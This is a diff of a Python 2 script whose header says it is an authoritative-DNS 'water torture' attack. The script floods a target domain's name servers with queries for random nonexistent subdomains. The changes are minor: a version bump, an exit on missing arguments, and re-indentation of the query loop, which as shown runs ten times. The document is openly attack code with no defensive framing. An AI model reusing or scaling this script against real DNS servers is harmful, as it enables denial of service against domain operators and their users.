@@ -5,7 +5,7 @@
 #Purpose : Ataque DNS autoritativo con peticion de subdominios aleatorios inexistentes
 #From: https://github.com/hackingyseguridad/watertorture/blob/master/subdominio.py 
 #-- Forked by Christopher Gray
-# Date: 4/19/18 - Version 0.0.3
+# Date: 4/19/18 - Version 0.0.4
 
 import dns.resolver
 import random
@@ -14,9 +14,10 @@ import socket
 
 print(sys.argv)
 
-if len(sys.argv) < 2:
+if len(sys.argv) <= 1:
     #print "Using: " , sys.argv[1] , " for domain "
     print "Please add Domain and DNS server you want to query against."
+    exit(0)
 elif len(sys.argv) >= 2:
     if sys.argv[1]:
         dominio = sys.argv[1]
@@ -37,16 +38,16 @@ elif len(sys.argv) >= 2:
 
 
 
-print "Domain:", dominio
-print "IP for Domain:", host
-	
-for x in range(0, 10):
-    print "We're on time %d" % (x)
-    subdominio = str(random.randrange(10000000))
-    url = subdominio+"."+dominio
-    print "SubDomain:", url
-    #r = dns.resolver.query('example.org', 'a')
-    answers = dns.resolver.query(url)
-    for rdata in answers: 
-        print "IP SubDomain:", rdata
+    print "Domain:", dominio
+    print "IP for Domain:", host
+        
+    for x in range(0, 10):
+        print "We're on time %d" % (x)
+        subdominio = str(random.randrange(10000000))
+        url = subdominio+"."+dominio
+        print "SubDomain:", url
+        #r = dns.resolver.query('example.org', 'a')
+        answers = dns.resolver.query(url)
+        for rdata in answers: 
+            print "IP SubDomain:", rdata
 
